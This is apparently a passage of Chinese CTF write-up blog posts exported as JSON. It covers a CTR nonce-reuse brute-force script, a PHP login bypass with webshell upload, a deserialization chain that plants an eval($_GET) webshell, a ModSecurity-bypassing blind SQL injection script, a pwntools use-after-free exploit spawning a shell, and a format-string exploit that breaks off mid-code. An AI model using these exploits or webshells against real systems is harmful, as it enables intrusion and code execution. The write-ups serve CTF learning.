= Counter.new(128, initial_value=sum(msg)) cipher = AES.new(key, AES.MODE_CTR, counter=ctr) return cipher.encrypt(msg) 是使用AES的CTR模式，百度了下是把counter加密和明文异或下，即密文是counter^msg,这里的问题就是ctr的初始值是sum(msg)，如果我们输入字符串的sum和flag一样的话，那counter就是一样的，所以flag = encflag^input^enc_input 爆破脚本为: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *import sysfrom Crypto.Util.number import *def encode_str(str1): res = '' idx = 0 for i in range(30): if str1[idx] != '\\\\': res += str1[idx] idx += 1 elif str1[idx] == '\\\\' and str1[idx+1] == 'x' and str1[idx+2] in \"0123456789abcdef\" and str1[idx+3] in \"0123456789abcdef\": res += chr(int(str1[idx+2:idx+4],16)) idx += 4 else: res += str1[idx] idx += 1 assert(len(res) == 30) return res# p = remote(\"111.186.57.123\",10001)def check(str1): for i in range(30): if ord(str1[i]) &lt; 0x20 or ord(str1[i]) &gt; 0x7f: return False return Truestart = 0x20*30end = 0x7f*30l = [0x20 for i in range(30)]# p.recvuntil(\"plaintext: \")while sum(l) &lt; end: # p = process(\"./aes.py\") p = remote(\"111.186.57.123\",10001) p.recvuntil(\"flag: b\") enc_flag = p.recvuntil(\"\\n\",drop=True)[1:-1] encflag = encode_str(enc_flag) for j in range(30): p.recvuntil(\"plaintext: \") plaintext = (''.join([chr(_) for _ in l])) p.sendline(plaintext.encode('hex')) #inc the l for k in range(30): if l[k] &lt; 0x7f: l[k] += 1 break p.recvuntil(\"ciphertext: b\") ciphertext = encode_str(p.recvuntil(\"\\n\",drop=True)[1:-1]) res = long_to_bytes(bytes_to_long(ciphertext)^bytes_to_long(plaintext)^bytes_to_long(encflag)) if check(res) == True: success(\"flag is : %s\" % res) sys.exit() info(str(sum(l))) p.close() # p.kill()# p.interactive() 最终sum(flag)在2760到2790之间flag为 flag{Don&#39;t_Reu5e_n0nCe_1n_CTR} webezupload&lt;!---/.login.php.swp--&gt;拿到源码 123456789101112131415161718192021222324252627&lt;?php#error_reporting(0);session_start();include \"config.php\";$username = $_POST['username'];$password = $_POST['password'];if (isset($username))&#123; $sql = \"select password from user where name=?\"; if ($stmt = $mysqli-&gt;prepare($sql)) &#123; $stmt-&gt;bind_param(\"s\", $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($dpasswd); $stmt-&gt;fetch(); if ($dpasswd === $password)&#123; $_SESSION['login'] = 1; header(\"Location: /upload.php\"); &#125;else&#123; die(\"login failed\"); &#125; $stmt-&gt;close(); &#125;&#125;else&#123; header(\"Location: /index.php\");&#125;$mysqli-&gt;close(); mysql没有查到记录时,$dpasswd===NULL此时令$password===NULL即$_POST[&#39;password&#39;]===NULL,则成功登陆 登陆后进入上传界面,测试发现,后端校验文件头和content-type过滤php后缀名,上传.php5文件,成功拿到shell 拿到flag:flag{logical_bypass_not_weak_password} ezbypassn day json bypass disable_function ezpop123456789101112131415161718192021222324252627282930313233343536&lt;?phpclass A&#123; protected $store; protected $key; protected $expire = '8888'; public $cache = []; public $autosave = false; public $complete = true; public function __construct () &#123; $this-&gt;store = new B(); $this-&gt;key = 'hi.php'; $this-&gt;cache = ['path'=&gt;'a','dirname'=&gt;base64_encode('&lt;?php eval($_GET[a]); ?'.'&gt; ')]; &#125;&#125;class B&#123; public $options = [ 'serialize' =&gt; 'serialize', 'prefix' =&gt; 'php://filter/write=convert.base64-decode/resource=uploads/', 'data_compress' =&gt; false ]; public $writeTimes = 1;&#125;echo file_get_contents('http://111.186.57.61:10401/?data=' . urlencode(serialize(new A())));echo '====='; ezjjavafastjson 1.2.47 RCEhttps://github.com/CaijiOrz/fastjson-1.2.47-RCE ezwaf参考之前 RoarCTF 中畸形包绕 modsecurity 1234567891011121314151617if __name__ == '__main__': res = 'flag&#123;abypass_modsecurity' for i in range(24, 50): for j in range(32, 127): payload = '''GET /?age=1%20or%201%20and%20ascii(substr((select%20*%20from%20flag_xdd),&#123;&#125;,1))=&#123;&#125;%20and%20sleep(0.7) HTTP/1.1Host: 111.186.57.43:10601Content-Length: 0Content-Length: 0'''.format(str(i), str(j)) exp = payload.encode().replace(b'\\n', b'\\r\\n') # print(exp) if send_raw(exp): res += chr(j) print(res) continue","categories":[],"tags":[]},{"title":"hacknote","slug":"hacknote","date":"2019-11-19T16:28:33.000Z","updated":"2019-11-20T08:29:06.000Z","comments":true,"path":"2019/11/19/hacknote/","link":"","permalink":"http://yoursite.com/2019/11/19/hacknote/","excerpt":"","text":"简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。 内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。 而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。 首先检查一下程序 1234567syc@ubuntu:~/Desktop/share/攻防世界PWN/hacknote$ checksec hacknote[*] &apos;/mnt/hgfs/share/\\xe6\\x94\\xbb\\xe9\\x98\\xb2\\xe4\\xb8\\x96\\xe7\\x95\\x8cPWN/hacknote/hacknote&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 然后用IDA Pro检查一下程序 123456789101112131415161718192021222324252627282930313233343536373839404142void __cdecl __noreturn main()&#123; int v0; // eax char buf; // [esp+8h] [ebp-10h] unsigned int v2; // [esp+Ch] [ebp-Ch] v2 = __readgsdword(0x14u); setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); while ( 1 ) &#123; while ( 1 ) &#123; menu(); read(0, &amp;buf, 4u); v0 = atoi(&amp;buf); if ( v0 != 2 ) break; Delete_note(); &#125; if ( v0 &gt; 2 ) &#123; if ( v0 == 3 ) &#123; Print_note(); &#125; else &#123; if ( v0 == 4 ) exit(0);LABEL_13: puts(\"Invalid choice\"); &#125; &#125; else &#123; if ( v0 != 1 ) goto LABEL_13; Add_note(); &#125; &#125;&#125; 我们可以简单分析下程序，可以看出在程序的开头有个 menu 函数，其中有 1234puts(&quot; 1. Add note &quot;);puts(&quot; 2. Delete note &quot;);puts(&quot; 3. Print note &quot;);puts(&quot; 4. Exit &quot;); 故而程序应该主要有 3 个功能。之后程序会根据用户的输入执行相应的功能。 add_note根据程序，我们可以看出程序最多可以添加 5 个 note。每个 note 有两个字段 put 与 content，其中 put 会被设置为一个函数，其函数会输出 content 具体的内容 12345678910111213141516171819202122232425262728293031323334353637383940414243444546unsigned int sub_8048646()&#123; _DWORD *v0; // ebx signed int i; // [esp+Ch] [ebp-1Ch] int size; // [esp+10h] [ebp-18h] char buf; // [esp+14h] [ebp-14h] unsigned int v5; // [esp+1Ch] [ebp-Ch] v5 = __readgsdword(0x14u); if ( dword_804A04C &lt;= 5 ) &#123; for ( i = 0; i &lt;= 4; ++i ) &#123; if ( !ptr[i] ) &#123; ptr[i] = malloc(8u); if ( !ptr[i] ) &#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; *(_DWORD *)ptr[i] = sub_804862B; printf(&quot;Note size :&quot;); read(0, &amp;buf, 8u); size = atoi(&amp;buf); v0 = ptr[i]; v0[1] = malloc(size); if ( !*((_DWORD *)ptr[i] + 1) ) &#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; printf(&quot;Content :&quot;); read(0, *((void **)ptr[i] + 1), size); puts(&quot;Success !&quot;); ++dword_804A04C; return __readgsdword(0x14u) ^ v5; &#125; &#125; &#125; else &#123; puts(&quot;Full&quot;); &#125; return __readgsdword(0x14u) ^ v5;&#125; print_noteprint_note 就是简单的根据给定的 note 的索引来输出对应索引的 note 的内容 12345678910111213141516171819unsigned int print_note()&#123; int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(&quot;Index :&quot;); read(0, &amp;buf, 4u); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;= count ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( notelist[v1] ) notelist[v1]-&gt;put(notelist[v1]); return __readgsdword(0x14u) ^ v3;&#125; delete_notedelete_note 会根据给定的索引来释放对应的 note。但是值得注意的是，在 删除的时候，只是单纯进行了 free，而没有设置为 NULL，那么显然，这里是存在 Use After Free 的情况的 1234567891011121314151617181920212223unsigned int del_note()&#123; int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(&quot;Index :&quot;); read(0, &amp;buf, 4u); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;= count ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( notelist[v1] ) &#123; free(notelist[v1]-&gt;content); free(notelist[v1]); puts(&quot;Success&quot;); &#125; return __readgsdword(0x14u) ^ v3;&#125; 我们可以看到UAF的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个magic函数，我们有没有可能来通过UAF来使得这个程序执行 magic 函数呢？一个很直接的想法是修改 note 的 put 字段为 magic 函数的地址，从而实现在执行 print note 的时候执行 magic 函数。 那么该怎么执行呢？ 我们可以简单来看一下每一个 note 生成的具体流程 程序申请 8 字节内存用来存放 note 中的 put 以及 content 指针 程序根据输入的 size 来申请指定大小的内存，然后用来存储 content 基本的思路是先add 两次，但是内容的大小不能是8字节，不然会分配 4个16字节的fast bin，那我们就没办法进行UAF，所以分配content的大小必须不是8字节，然后再delete两次，此时 fastbin链表 note1 结构体 16 bytes（8B) high address note1 content 32 bytes（16B) note0 结构体 16 bytes（8B) note0 content 32 bytes（16B) fastbin head low address 由于题目提供了libc，我们可以先触发一次漏洞来泄露地址，然后再触发一次漏洞来执行system 这里有个问题就是system函数的参数，原来的printf函数传入的是指向结构体的指针，那么此时system传入该函数的参数就是note0结构体自身，无法直接传如字符串“\\bin\\sh”，这里的知识点是system参数可用“||”截断，比如 system(“hsasoijiojo||/bin/sh”) 我们来调试一下 当我们进行第一次add note的时候 12345678910111213141516171819202122[DEBUG] Received 0xc5 bytes: '----------------------\\n' ' HackNote \\n' '----------------------\\n' ' 1. Add note \\n' ' 2. Delete note \\n' ' 3. Print note \\n' ' 4. Exit \\n' '----------------------\\n' 'Your choice :'[DEBUG] Sent 0x2 bytes: '1\\n'[DEBUG] Received 0xb bytes: 'Note size :'[DEBUG] Sent 0x3 bytes: '32\\n'[DEBUG] Received 0x9 bytes: 'Content :'[DEBUG] Sent 0x8 bytes: 'a' * 0x8[DEBUG] Received 0xa bytes: 'Success !\\n' 查看堆的情况 12345678910111213141516171819202122232425pwndbg&gt; heap0x9d9b008 PREV_INUSE &#123; mchunk_prev_size = 0, mchunk_size = 337, fd = 0x0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x0&#125;0x9d9b158 FASTBIN &#123; mchunk_prev_size = 0, mchunk_size = 17, fd = 0x804862b, bk = 0x9d9b170, fd_nextsize = 0x0, bk_nextsize = 0x31&#125;0x9d9b168 FASTBIN &#123; mchunk_prev_size = 0, mchunk_size = 49, fd = 0x61616161, bk = 0x61616161, fd_nextsize = 0x0, bk_nextsize = 0x0&#125; 可以发现已经分配了一个大小为17的chunk（即note0的结构体），和一个大小为49的chunk（即note0的content），note1同理 当删除的时候fastbin列表就像我们设想的那样，这里有一个坑，如果是本地调试的话，tcache是libc2.26之后引进的一种新机制，类似于fastbin一样的东西，每条链上最多可以有 7 个 chunk，free的时候当tcache满了才放入fastbin，unsorted bin，malloc的时候优先去tcache找 123456789gef➤ heap bins───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────Fastbins[idx=0, size=0x8] ← UsedChunk(addr=0x804b040, size=0x10) ← UsedChunk(addr=0x804b008, size=0x10) Fastbins[idx=1, size=0xc] 0x00Fastbins[idx=2, size=0x10] 0x00Fastbins[idx=3, size=0x14] ← UsedChunk(addr=0x804b050, size=0x28) ← UsedChunk(addr=0x804b018, size=0x28) Fastbins[idx=4, size=0x18] 0x00Fastbins[idx=5, size=0x1c] 0x00Fastbins[idx=6, size=0x20] 0x00 最终的EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *#sh=process('./hacknote')sh=remote('chall.pwnable.tw',10102)elf=ELF('./hacknote')libc=ELF('./libc_32.so.6')#libc=ELF('/lib/i386-linux-gnu/libc.so.6')def addnote(size,content): sh.recvuntil('Your choice :') sh.sendline('1') sh.recvuntil('Note size :') sh.sendline(str(size)) sh.recvuntil('Content :') sh.send(content)def printnote(idx): sh.recvuntil('Your choice :') sh.sendline('3') sh.recvuntil('Index :') sh.sendline(str(idx))def delnote(idx): sh.recvuntil('Your choice :') sh.sendline('2') sh.recvuntil('Index :') sh.sendline(str(idx))addnote(0x20,'aaaaaaaa') #idx0addnote(0x20,'aaaaaaaa') #idx1delnote(0)delnote(1)puts_got=elf.got['puts']fun=0x0804862Baddnote(0x8,p32(fun)+p32(puts_got)) printnote(0)puts_adr=u32(sh.recv(4))print 'puts_adr: '+hex(puts_adr)libc_base=puts_adr-libc.symbols['puts']print 'libc_base: '+hex(libc_base)system_adr=libc_base+libc.symbols['system']delnote(2)payload=p32(system_adr)+'||sh'addnote(0x8,payload)printnote(0)sh.interactive()","categories":[],"tags":[]},{"title":"CTF-PWN-Tips-1","slug":"CTF-PWN-Tips-1","date":"2019-11-17T03:25:34.000Z","updated":"2019-11-17T19:25:52.000Z","comments":true,"path":"2019/11/16/CTF-PWN-Tips-1/","link":"","permalink":"http://yoursite.com/2019/11/16/CTF-PWN-Tips-1/","excerpt":"","text":"搜索libc https://libc.nullbyte.cat/ 恢复linux下静态编译程序的符号表先去https://github.com/push0ebp/sig-database把sig文件都下载下来，然后用ida打开程序之后 选择FILE--&gt;LOAD_FILE--&gt;FLIRT,选择对应版本的libc即可 但是要把相对应的.sig放在($IDA)/sig/pc/目录下 源码调试glibc三部曲 123sudo apt install glibc-sourcesudo apt install libc6-dbgsudo tar -xf /usr/src/glibc/glibc-2.23.tar.xz 搞好后 程序运行时贴上去/usr/src/glibc/glibc-2.23/时源码目录，然后后面的文件夹要自己指定下 1pwndbg&gt; directory /usr/src/glibc/glibc-2.23/stdlib/ 然后就可以快乐debug了 12345678910111213141516171819202122232425262728293031323334 0x7f7c75a3f030 &lt;exit&gt; lea rsi, [rip + 0x38a5c1] &lt;0x7f7c75dc95f8&gt; 0x7f7c75a3f037 &lt;exit+7&gt; sub rsp, 8 ► 0x7f7c75a3f03b &lt;exit+11&gt; mov edx, 1 0x7f7c75a3f040 &lt;exit+16&gt; call __run_exit_handlers &lt;0x7f7c75a3ef10&gt; 0x7f7c75a3f045 nop word ptr cs:[rax + rax] 0x7f7c75a3f04f nop 0x7f7c75a3f050 &lt;on_exit&gt; push rbp 0x7f7c75a3f051 &lt;on_exit+1&gt; push rbx 0x7f7c75a3f052 &lt;on_exit+2&gt; mov rbx, rdi 0x7f7c75a3f055 &lt;on_exit+5&gt; lea rdi, [rip + 0x38a59c] &lt;0x7f7c75dc95f8&gt; 0x7f7c75a3f05c &lt;on_exit+12&gt; mov rbp, rsi──────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────In file: /usr/src/glibc/glibc-2.23/stdlib/exit.c 99 100 101 void 102 exit (int status) 103 &#123; ► 104 __run_exit_handlers (status, &amp;__exit_funcs, true); 105 &#125; 106 libc_hidden_def (exit)──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────00:0000│ rsp 0x7fffb8837a40 —▸ 0x4008f0 (__libc_csu_init) ◂— push r1501:0008│ 0x7fffb8837a48 —▸ 0x7f7c75a25837 (__libc_start_main+247) ◂— xor edx, edx02:0010│ 0x7fffb8837a50 ◂— 0x103:0018│ 0x7fffb8837a58 —▸ 0x7fffb8837b28 —▸ 0x7fffb88391e5 ◂— './easy_printf'04:0020│ 0x7fffb8837a60 ◂— 0x175ff4ca005:0028│ 0x7fffb8837a68 —▸ 0x4008c4 (main) ◂— push rbp06:0030│ 0x7fffb8837a70 ◂— 0x007:0038│ 0x7fffb8837a78 ◂— 0xf14646c49173d8d5────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────── ► f 0 7f7c75a3f03b exit+11 f 1 7f7c75a25837 __libc_start_main+247 舒服死了","categories":[],"tags":[]},{"title":"SUCTF2019-playfmt-printf的成链攻击","slug":"SUCTF2019-playfmt-printf╡─│╔┴┤╣Ñ╗≈","date":"2019-11-12T17:06:36.000Z","updated":"2019-11-13T09:07:08.000Z","comments":true,"path":"2019/11/12/SUCTF2019-playfmt-printf╡─│╔┴┤╣Ñ╗≈/","link":"","permalink":"http://yoursite.com/2019/11/12/SUCTF2019-playfmt-printf╡─│╔┴┤╣Ñ╗≈/","excerpt":"","text":"首先检查一下程序 1234567syc@ubuntu:~/Desktop/share/tmp/playfmt$ checksec playfmt[*] '/mnt/hgfs/share/tmp/playfmt/playfmt' Arch: i386-32-little RELRO: Full RELRO Stack: No canary found NX: NX enabledx PIE: No PIE (0x8048000) 可以知道我们无法修改got表，栈上的代码不可执行，尝试执行一下 12syc@ubuntu:~/Desktop/share/tmp/playfmt$ ./playfmtopen flag error , please contact the administrator! 123456789101112syc@ubuntu:~/Desktop/share/tmp/playfmt$ ./playfmtTesting my C++ skills...testing 1...hello,worldtesting 2...hello,worldtesting 3...You think I will leave the flag?hello,world===================== Magic echo Server===================== 用IDA Pro查看一下源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051int __cdecl main(int argc, const char **argv, const char **envp)&#123; derived *v3; // ebx derived *v4; // ebx derived *v5; // ebx int v6; // ST2C_4 char *v8; // [esp+0h] [ebp-24h] FILE *stream; // [esp+4h] [ebp-20h] v8 = (char *)malloc(0x10u); stream = fopen(\"flag.txt\", \"r\"); if ( !stream ) &#123; puts(\"open flag error , please contact the administrator!\"); exit(0); &#125; fscanf(stream, \"%s\", v8); fclose(stream); puts(\"Testing my C++ skills...\"); puts(\"testing 1...\"); v3 = (derived *)operator new(8u); derived::derived(v3, 0); if ( v3 ) &#123; derived::~derived(v3); operator delete((void *)v3); &#125; puts(\"testing 2...\"); v4 = (derived *)operator new(8u); derived::derived(v4); if ( v4 ) &#123; derived::~derived(v4); operator delete((void *)v4); &#125; puts(\"testing 3...\"); v5 = (derived *)operator new(8u); derived::derived(v5, v8); puts(\"You think I will leave the flag?\"); if ( v5 ) &#123; base::~base(v5); operator delete((void *)v5); &#125; v6 = Get_return_addr(); setvbuf(stdout, 0, 2, 0); logo(); if ( Get_return_addr() != v6 ) exit(0); return 0;&#125; 找到关键功能函数logo 123456789101112131415bool logo(void)&#123; int v0; // ST1C_4 bool result; // al v0 = Get_return_addr(); puts(\"=====================\"); puts(\" Magic echo Server\"); puts(\"=====================\"); do_fmt(); result = Get_return_addr() != v0; if ( result ) exit(0); return result;&#125; 找到漏洞点do_fmt 1234567891011121314int do_fmt(void)&#123; int result; // eax while ( 1 ) &#123; read(0, buf, 0xC8u); result = strncmp(buf, \"quit\", 4u); if ( !result ) break; printf(buf); &#125; return result;&#125; 程序漏洞点比较明显，直接写了一个循环的printf格式化漏洞，而输入的数据是存储在buf指针上 12345678910111213141516171819202122232425262728293031323334353637383940syc@ubuntu:~/Desktop/share/tmp/playfmt$ readelf -S playfmtThere are 30 section headers, starting at offset 0x2c44:Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .interp PROGBITS 08048154 000154 000013 00 A 0 0 1 [ 2] .note.ABI-tag NOTE 08048168 000168 000020 00 A 0 0 4 [ 3] .note.gnu.build-i NOTE 08048188 000188 000024 00 A 0 0 4 [ 4] .gnu.hash GNU_HASH 080481ac 0001ac 0000b4 04 A 5 0 4 [ 5] .dynsym DYNSYM 08048260 000260 000190 10 A 6 1 4 [ 6] .dynstr STRTAB 080483f0 0003f0 000159 00 A 0 0 1 [ 7] .gnu.version VERSYM 0804854a 00054a 000032 02 A 5 0 2 [ 8] .gnu.version_r VERNEED 0804857c 00057c 000060 00 A 6 2 4 [ 9] .rel.dyn REL 080485dc 0005dc 000098 08 A 5 0 4 [10] .rel.plt REL 08048674 000674 000008 08 AI 5 23 4 [11] .init PROGBITS 0804867c 00067c 000023 00 AX 0 0 4 [12] .plt PROGBITS 080486a0 0006a0 000020 04 AX 0 0 16 [13] .plt.got PROGBITS 080486c0 0006c0 000090 00 AX 0 0 8 [14] .text PROGBITS 08048750 000750 000532 00 AX 0 0 16 [15] .fini PROGBITS 08048c84 000c84 000014 00 AX 0 0 4 [16] .rodata PROGBITS 08048c98 000c98 0000e9 00 A 0 0 4 [17] .eh_frame_hdr PROGBITS 08048d84 000d84 00007c 00 A 0 0 4 [18] .eh_frame PROGBITS 08048e00 000e00 000218 00 A 0 0 4 [19] .init_array INIT_ARRAY 0804ae98 001e98 000008 00 WA 0 0 4 [20] .fini_array FINI_ARRAY 0804aea0 001ea0 000004 00 WA 0 0 4 [21] .jcr PROGBITS 0804aea4 001ea4 000004 00 WA 0 0 4 [22] .dynamic DYNAMIC 0804aea8 001ea8 000100 08 WA 6 0 4 [23] .got PROGBITS 0804afa8 001fa8 000058 04 WA 0 0 4 [24] .data PROGBITS 0804b000 002000 000008 00 WA 0 0 4 [25] .bss NOBITS 0804b020 002008 0000ec 00 WA 0 0 32 [26] .comment PROGBITS 00000000 002008 000035 01 MS 0 0 1 [27] .shstrtab STRTAB 00000000 002b40 000101 00 0 0 1 [28] .symtab SYMTAB 00000000 002040 000660 10 29 49 4 [29] .strtab STRTAB 00000000 0026a0 0004a0 00 0 0 1Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS processing required), G (group), T (TLS), C (compressed), x (unknown), o (OS specific), E (exclude), p (processor specific) buf则是位于bss段中地址为0x0804B040 123.bss:0804B040 public buf.bss:0804B040 ; char buf[200].bss:0804B040 buf db 0C8h dup(?) ; DATA XREF: do_fmt(void)+E↑o 所以思路就是直接修改栈上的返回地址，return的时候劫持流程 我们首先复习一下格式化字符 格式化字符串漏洞的具体原理就不再详细叙述，这里主要简单介绍一下格式化参数位置的计算和漏洞利用时常用的格式字符。 参数位置计算 linux下32位程序是栈传参，从左到右参数顺序为$esp+4,$esp+8,...；因此$esp+x的位置应该是格式化第x/4个参数。 linux下64位程序是寄存器加栈传参，从左到右参数顺序为$rdi,$rsi,$rdx,$rcx,$r8,$r9,$rsp+8,...；因此$rsp+x的位置应该是格式化第x/8+6个参数。 常用的格式化字符 用于地址泄露的格式化字符有：%x、%s、%p等； 用于地址写的格式化字符：%hhn（写入一字节），%hn（写入两字节），%n（32位写四字节，64位写8字节）； %&lt; number&gt;$type：直接作用第number个位置的参数，如：%7$x读第7个位置参数值，%7$n对第7个参数位置进行写。 %c：输出number个字符，配合%n进行任意地址写，例如&quot;%{}c%{}$hhn&quot;.format(address,offset)就是向offset0参数指向的地址最低位写成address 一般来说，栈上的格式化字符串漏洞利用步骤是先泄露地址，包括ELF程序地址和libc地址；然后将需要改写的GOT表地址直接传到栈上，同时利用%c%n的方法改写入system或one_gadget地址，最后就是劫持流程。但是对于BSS段或是堆上格式化字符串，无法直接将想要改写的地址指针放置在栈上，也就没办法实现任意地址写。 那我们就先下一个断点在printf执行之前，看看栈上有什么可以利用的东西 12345678910pwndbg&gt; stack00:0000│ esp 0xffffd030 —▸ 0x804b040 (buf) ◂— 0xa /* '\\n' */01:0004│ 0xffffd034 —▸ 0x8048cac ◂— jno 0x8048d23 /* 'quit' */02:0008│ 0xffffd038 ◂— 0x403:000c│ 0xffffd03c —▸ 0x80488e8 (logo()+59) ◂— add esp, 0x1004:0010│ 0xffffd040 —▸ 0x8048cb1 ◂— cmp eax, 0x3d3d3d3d /* '=====================' */05:0014│ 0xffffd044 —▸ 0x8048ac4 (main+440) —▸ 0xfffd82e8 ◂— 0x006:0018│ ebp 0xffffd048 —▸ 0xffffd068 —▸ 0xffffd098 ◂— 0x007:001c│ 0xffffd04c —▸ 0x80488f0 (logo()+67) —▸ 0xffff56e8 ◂— 0x008:0020│ 0xffffd050 —▸ 0xf7e30000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c 1234567891011121314151617181920212223242526272829pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x8048000 0x804a000 r-xp 2000 0 /mnt/hgfs/share/tmp/playfmt/playfmt 0x804a000 0x804b000 r--p 1000 1000 /mnt/hgfs/share/tmp/playfmt/playfmt 0x804b000 0x804c000 rw-p 1000 2000 /mnt/hgfs/share/tmp/playfmt/playfmt 0x804c000 0x806e000 rw-p 22000 0 [heap]0xf7b36000 0xf7b38000 rw-p 2000 0 0xf7b38000 0xf7b54000 r-xp 1c000 0 /lib/i386-linux-gnu/libgcc_s.so.10xf7b54000 0xf7b55000 r--p 1000 1b000 /lib/i386-linux-gnu/libgcc_s.so.10xf7b55000 0xf7b56000 rw-p 1000 1c000 /lib/i386-linux-gnu/libgcc_s.so.10xf7b56000 0xf7c56000 r-xp 100000 0 /lib/i386-linux-gnu/libm-2.27.so0xf7c56000 0xf7c57000 r--p 1000 ff000 /lib/i386-linux-gnu/libm-2.27.so0xf7c57000 0xf7c58000 rw-p 1000 100000 /lib/i386-linux-gnu/libm-2.27.so0xf7c58000 0xf7e2d000 r-xp 1d5000 0 /lib/i386-linux-gnu/libc-2.27.so0xf7e2d000 0xf7e2e000 ---p 1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so0xf7e2e000 0xf7e30000 r--p 2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so0xf7e30000 0xf7e31000 rw-p 1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so0xf7e31000 0xf7e34000 rw-p 3000 0 0xf7e34000 0xf7fb0000 r-xp 17c000 0 /usr/lib32/libstdc++.so.6.0.250xf7fb0000 0xf7fb6000 r--p 6000 17b000 /usr/lib32/libstdc++.so.6.0.250xf7fb6000 0xf7fb7000 rw-p 1000 181000 /usr/lib32/libstdc++.so.6.0.250xf7fb7000 0xf7fba000 rw-p 3000 0 0xf7fd0000 0xf7fd2000 rw-p 2000 0 0xf7fd2000 0xf7fd5000 r--p 3000 0 [vvar]0xf7fd5000 0xf7fd6000 r-xp 1000 0 [vdso]0xf7fd6000 0xf7ffc000 r-xp 26000 0 /lib/i386-linux-gnu/ld-2.27.so0xf7ffc000 0xf7ffd000 r--p 1000 25000 /lib/i386-linux-gnu/ld-2.27.so0xf7ffd000 0xf7ffe000 rw-p 1000 26000 /lib/i386-linux-gnu/ld-2.27.so0xfff00000 0xffffe000 rw-p fe000 0 [stack] 首先需要得到当前栈的地址和libc的基地址，这些地址可以很轻松的在栈上找到 不难发现栈上有libc地址 10xf7e30000 0xf7e31000 rw-p 1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so 108:0020│ 0xffffd050 —▸ 0xf7e30000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d7d6c 可知esp+0x18存放了栈地址，esp+0x20存放了libc的地址，根据32位栈溢出的公式可以得知 12esp+0x18 : 0x18 / 4 = 8esp+0x20 : 0x20 / 4 = 8 可以得到分别是第6个参数和第8个参数，直接传入%6$p%8$p即可得到栈地址和libc地址 printf成链攻击的缺点就是需要很多次printf，但是如果你有任意地址读写权限后，相信做到这一点也并非难事 这里主要需要解决的就是如何将要改写的地址放在栈上。实现任意地址写需要依赖栈上存在一个链式结构 10xffffd048-&gt;0xffffd068-&gt;0xffffd098 这三个地址都在栈上，我们就可以利用printf的%n对不同链层的数据进行修改，从而使得这条数据链可以指向任意地址 下图是一个简单的栈地址空间图，offset表示格式化的参数位置。通过第offset0个参数，利用%hhn可以控制address1的最低位，再通过第offset1个参数，利用%hhn可以写address2的最低位；然后通过offset0参数，利用%hhn修改address1的最低位为原始值+1，再通过offset1参数，利用%hhn可以写address2的次低位；依次循环即可完全控制address2的值，再次利用address1和address2的链式结构，即可实现对address2地址空间的任意写。对应到上面显示的地址空间 123address0=0xffffd048,offset0=0x18/4=6;address1=0xffffd068,offset1=0x38/4=14;address2=0xffffd098,offset2=0x68/4=26; 这里我用上面的数据链简单举个例，我们可以利用0xffffd068—▸ 0xffffd098◂— 0x0来修改0xffffd098地址的数据，但是printf的%n最大只能修改到0x2000，也就是说我们一般只能修改一个byte，原本这并没有什么用，但是别忘了，这是一条完整的数据链，我们可以利用ebp 0xffffd048—▸ 0xffffd068—▸ 0xffffd098修改0xffffd068的低地址数据（0xffffd098）的低地址，简单来说就是修改为0xffffd099，然后 0xffffd068 —▸ 0xffffd098◂— 0x0就会变成0xffffd068 —▸ 0xffffd099◂— 0x0，接下来我们就可以利用这条链修改0xffffd099地址的值，也就是第二个byte，依次类推，我们就能在栈上写任意地址，然后在用栈上的地址进行任意读写。就这样往往复复，造成了这个恶性循环。 简单来说就是一条栈数据链，前面的链功能是修改我们要任意读写的地址，后面的链的功能则是对前面修改出来的地址进行任意读写。 下面是地址写代码的实现，首先获取address1的最低位的原始值，然后依次写address2的各个字节 12345678910111213def write_address(off0,off1,target_addr): io.sendline(&quot;%&#123;&#125;$p&quot;.format(off1)) io.recvuntil(&quot;0x&quot;) addr1 = int(io.recv(8),16)&amp;0xff io.recv() for i in range(4): 